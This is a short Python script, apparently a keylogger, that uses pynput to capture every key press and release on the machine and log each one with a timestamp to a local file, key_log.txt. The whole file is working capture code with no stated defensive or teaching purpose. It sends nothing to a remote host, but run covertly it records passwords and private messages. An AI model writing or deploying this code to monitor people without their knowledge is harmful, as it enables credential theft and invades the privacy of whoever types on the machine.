from pynput.keyboard import Listener
import logging

# Setup logging
logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):  # The function that's called when a key is pressed
    logging.info("Key pressed: {0}".format(key))

def on_release(key):  # The function that's called when a key is released
    logging.info("Key released: {0}".format(key))

with Listener(on_press=on_press, on_release=on_release) as listener:  # Create an instance of Listener
    listener.join()  # Join the listener thread to the main thread to keep waiting for keys
